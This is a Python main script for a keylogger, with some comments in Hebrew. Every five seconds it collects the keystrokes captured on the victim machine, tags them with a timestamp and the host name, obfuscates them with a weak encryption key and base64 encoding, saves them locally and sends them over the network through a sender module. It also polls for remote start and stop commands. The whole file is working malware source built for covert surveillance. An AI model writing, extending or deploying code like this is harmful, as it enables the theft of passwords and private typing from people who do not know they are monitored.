import time
import socket
from logger import KeyLoggerService
from writer import FileWriter
from sender import NetworkWriter
from encryption import Encryptor
import base64
from systeminfo import get_system_info
from startandstop import poll_commands as start_stop
def main():
    service = KeyLoggerService()
    writer = FileWriter()
    sender = NetworkWriter()
    encryption_key = 42                # פה מכניסים את מילת ההצפנה
    encryptor = Encryptor(encryption_key)
    Systeminfo = get_system_info()
    buffer = []
    start_stop()


    try:
        while True:
            time.sleep(5)   # כאן מוגדר כל כמה שניות שומר הקשות ושלוח
            keys = service.get_logged_keys()
            print(keys)
            if keys:
                buffer.extend(keys)

            if buffer:
                data = ''.join(buffer)
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                data = f"[{timestamp}] \n [{Systeminfo["node_name"]}] \n{data}"
                encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
                encrypted_b64 = base64.b64encode(encrypted_bytes).decode("utf-8")  # Base64 encode before sending


                writer.write_data(encrypted_b64)
                sender.send_data(encrypted_b64,Systeminfo,encryption_key)

                buffer = []

    except KeyboardInterrupt:
        if buffer:
            data = ''.join(buffer)
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            data = f"[{timestamp}] \n  [{Systeminfo["node_name"]}] \n{data}"
            encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
            encrypted_b64 = base64.b64encode(encrypted_bytes).decode("utf-8")  # Base64 encode before sending

            writer.write_data(encrypted_b64)
            sender.send_data(encrypted_b64, Systeminfo, encryption_key)

if __name__ == "__main__":
    main()